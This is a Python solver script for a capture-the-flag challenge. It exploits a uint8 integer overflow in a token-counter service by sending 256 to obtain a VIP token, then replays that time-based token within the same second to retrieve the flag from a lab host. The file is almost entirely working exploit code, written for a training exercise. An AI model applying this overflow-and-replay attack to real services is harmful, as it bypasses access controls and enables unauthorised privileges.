#!/usr/bin/env python3
"""
Solver for PWN CHALLENGE 4 (VinAI API Token Counter)
Vulnerability: uint8 integer overflow + time-based token reuse

The token counter uses a uint8 (unsigned 8-bit) variable. Sending 256 causes
it to overflow to 0, triggering "unlimited mode" and issuing a VIP token.
The token is time-based and must be reused within the same second.
"""
import socket
import time
import sys
import re

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

HOST = '172.31.102.101'
PORT = 10053

def recv_until(s, timeout=1.5):
    s.settimeout(timeout)
    data = b''
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except: pass
    return data

def solve():
    for attempt in range(10):
        print(f"[*] Attempt {attempt+1}/10...")

        # Step 1: Get VIP token via uint8 overflow
        s1 = socket.socket()
        s1.settimeout(5)
        s1.connect((HOST, PORT))
        recv_until(s1, 0.3)
        s1.sendall(b'1\n256\n')
        time.sleep(0.15)
        resp = recv_until(s1, 0.3)
        s1.close()

        m = re.search(r'VIP-[A-F0-9]+', resp.decode(errors='replace'))
        if not m:
            print("  [-] Failed to get token, retrying...")
            continue
        token = m.group(0)

        # Step 2: Submit token ASAP
        s2 = socket.socket()
        s2.settimeout(5)
        s2.connect((HOST, PORT))
        recv_until(s2, 0.2)
        s2.sendall(b'2\n')
        time.sleep(0.1)
        recv_until(s2, 0.2)
        s2.sendall(token.encode() + b'\n')
        time.sleep(0.3)
        resp = recv_until(s2, 1)
        text = resp.decode(errors='replace')
        s2.close()

        flag_match = re.search(r'flag\{[^}]+\}', text)
        if flag_match:
            print(f"[+] FLAG: {flag_match.group(0)}")
            return flag_match.group(0)
        elif 'verified' in text.lower():
            print(f"[+] Verified! {text.strip()}")
            return text
        else:
            print(f"  [-] Token {token} rejected (timing issue), retrying...")
        
        time.sleep(0.1)

    print("[-] Failed after 10 attempts")
    return None

if __name__ == '__main__':
    if len(sys.argv) > 1:
        HOST = sys.argv[1]
    if len(sys.argv) > 2:
        PORT = int(sys.argv[2])
    solve()
